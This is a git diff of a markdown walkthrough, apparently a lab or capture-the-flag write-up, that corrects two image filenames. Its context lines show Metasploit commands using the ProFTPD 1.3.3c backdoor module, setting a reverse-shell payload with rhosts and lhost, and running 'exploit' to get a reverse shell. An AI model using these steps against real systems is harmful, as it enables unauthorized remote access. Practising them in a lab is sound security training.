@@ -24,7 +24,7 @@ search proftpd
 use exploit/unix/ftp/proftpd_133c_backdoor
 ```
 
-<img src="metsploit_module.png">
+<img src="metasploit_module.png">
 
 For this module, you need to set the payload, so we use the command ```set payload cmd/unix/reverse``` and we set the options.
 
@@ -34,7 +34,7 @@ set rhosts <ip_address_of_target>
 set lhost <your_ip_address>
 ```
 
-<img src="metaploit_module_ready">
+<img src="metaploit_module_ready.png">
 
 Now we simply type ```exploit``` and **BOOM** we have a reverse shell.
 
